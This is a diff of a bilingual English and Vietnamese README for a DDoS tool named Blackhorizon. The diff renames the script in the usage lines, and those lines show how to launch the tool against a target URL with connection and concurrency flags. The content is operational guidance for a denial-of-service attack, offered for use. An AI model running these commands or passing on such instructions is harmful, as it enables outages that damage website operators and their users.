@@ -5,9 +5,9 @@
 *`cd Black`
 
 # How to use the Blackhorizon DDoS tool?
-*`python2 black.py`
+*`python2 blackhorizon.py`
 
-*`python2 black.py https://www.example.com -s 30 -c 30`
+*`python2 blackhorizon.py https://www.example.com -s 30 -c 30`
 
 # -c, --clounds Number of concurrent clounds     (default: 1)
 
@@ -20,9 +20,9 @@
 *`cd Black`
 
 # Làm thế nào để sử dụng tool DDoS Blackhorizon
-*`python2 black.py`
+*`python2 blackhorizon.py`
 
-*`python2 black.py https://www.example.com -s 30 -c 30`
+*`python2 blackhorizon.py https://www.example.com -s 30 -c 30`
 
 # -c, --clounds Số lượng cụm đồng thời (mặc định: 1)
 
